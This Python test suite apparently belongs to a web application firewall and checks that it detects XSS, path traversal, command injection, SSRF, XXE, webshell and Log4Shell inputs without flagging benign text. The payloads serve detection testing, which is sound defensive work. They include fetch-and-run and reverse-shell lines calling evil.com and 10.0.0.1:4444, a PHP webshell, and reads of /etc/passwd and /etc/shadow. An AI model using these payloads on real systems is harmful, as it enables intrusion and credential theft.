"""
End-to-End Comprehensive Attack Coverage Verification Suite (>90%+ Coverage).
Validates SQLi, XSS, Path Traversal/LFI, RCE, SSRF, Deserialization, Webshells,
and API Security with zero false positives on natural text.
"""

from bastion.semantic.sql_parser import SQLSemanticParser
from bastion.semantic.html_js_parser import HTMLJSSemanticParser
from bastion.semantic.path_analyzer import PathSemanticAnalyzer
from bastion.semantic.shell_parser import ShellSemanticParser
from bastion.semantic.url_ip_analyzer import URLIPSuggestedAnalyzer
from bastion.core.engine import Engine
from bastion.core.inspector import inspect_request


def test_advanced_xss_detection():
    vectors = [
        "<script>alert(1)</script>",
        "<svg/onload=alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        "<img src=x onerror=alert(1)>",
        "<details ontoggle=alert(1)>",
        "javascript:alert(1)",
        "java\x00script:alert(1)",
        "&#x6a;&#x61;vascript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "<audio src=x onerror=alert(1)>",
        "<math><mtext><table><mglyph></mglyph><svg><style><!--</style><img src=x onerror=alert(1)>",
    ]
    for v in vectors:
        threat, reason, _ = HTMLJSSemanticParser.analyze(v)
        assert threat, f"Failed to detect XSS vector: {v}"

    clean = [
        "5 < 10 and 20 > 5 are basic math comparisons",
        "Please confirm your order by clicking (yes/no)",
        "Documentation section 3.4: alert dialogs in JavaScript",
        "The price is $5.00 < regular price $10.00",
    ]
    for c in clean:
        threat, reason, _ = HTMLJSSemanticParser.analyze(c)
        assert not threat, f"False positive on clean text: {c} (Reason: {reason})"


def test_advanced_traversal_lfi_detection():
    vectors = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/shadow",
        "..;/..;/etc/hosts",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "/proc/self/environ",
        "/var/log/auth.log",
        ".env",
        "wp-config.php",
    ]
    for v in vectors:
        threat, reason, _ = PathSemanticAnalyzer.analyze(v)
        assert threat, f"Failed to detect LFI vector: {v}"


def test_advanced_rce_detection():
    vectors = [
        "; cat /etc/passwd",
        "| whoami",
        "&& id",
        "`whoami`",
        "$(whoami)",
        "cat${IFS}/etc/passwd",
        "c'a't /etc/passwd",
        "curl http://evil.com/sh | bash",
        "/dev/tcp/10.0.0.1/4444",
        "nc -e /bin/sh 10.0.0.1 4444",
        "powershell.exe -enc JABhID0A...",
    ]
    for v in vectors:
        threat, reason, _ = ShellSemanticParser.analyze(v)
        assert threat, f"Failed to detect RCE vector: {v}"


def test_advanced_ssrf_detection():
    vectors = [
        "http://127.0.0.1:8000/",
        "http://2130706433/",  # Decimal IP
        "http://0x7f000001/",  # Hex IP
        "http://0177.0.0.1/",  # Octal IP
        "http://127.1/",       # Shortened IP
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://[::1]/",
        "gopher://127.0.0.1:6379/_flushall",
        "file:///etc/passwd",
        "dict://127.0.0.1:11211/stat",
        "http://attacker.com@127.0.0.1/",
    ]
    for v in vectors:
        threat, reason, _ = URLIPSuggestedAnalyzer.analyze(v)
        assert threat, f"Failed to detect SSRF vector: {v}"


def test_engine_evaluates_all_categorized_rules():
    engine = Engine()

    test_cases = [
        # (method, path, query, body, expected_rule)
        ("GET", "/search", "q=1' UNION SELECT null, username, password FROM users--", "", "942100"),
        ("GET", "/comment", "msg=<svg/onload=alert(1)>", "", "941100"),
        ("GET", "/file", "name=../../../../etc/passwd", "", "930120"),
        ("GET", "/exec", "cmd=cat /etc/passwd; id", "", "932100"),
        ("GET", "/webhook", "url=http://169.254.169.254/latest/meta-data/", "", "934100"),
        ("GET", "/template", "name={{7*7}}", "", "933100"),
        ("POST", "/xml", "", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "933200"),
        ("POST", "/deserialize", "", "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "933300"),
        ("POST", "/upload", "", "<?php system($_GET['cmd']); ?>", "933400"),
        ("GET", "/log", "user=${jndi:ldap://attacker.com/a}", "", "933500"),
        ("POST", "/api/user", "", '{"__proto__": {"admin": true}}', "933600"),
        ("POST", "/api/role", "", '{"role": "superadmin", "is_admin": true}', "950100"),
        ("POST", "/graphql", "", '{"query": "{ __schema { types { name } } }"}', "950200"),
    ]

    for method, path, query, body, exp_rule in test_cases:
        inspection = inspect_request(
            method=method,
            path=path,
            query_string=query,
            headers={},
            body=body.encode("utf-8"),
            client_ip="10.0.0.1",
        )
        verdict = engine.evaluate(inspection.request)
        assert verdict.blocked is True, f"Failed to block test case: {method} {path}?{query}"
        assert verdict.rule_id == exp_rule, f"Expected rule {exp_rule}, got {verdict.rule_id}"
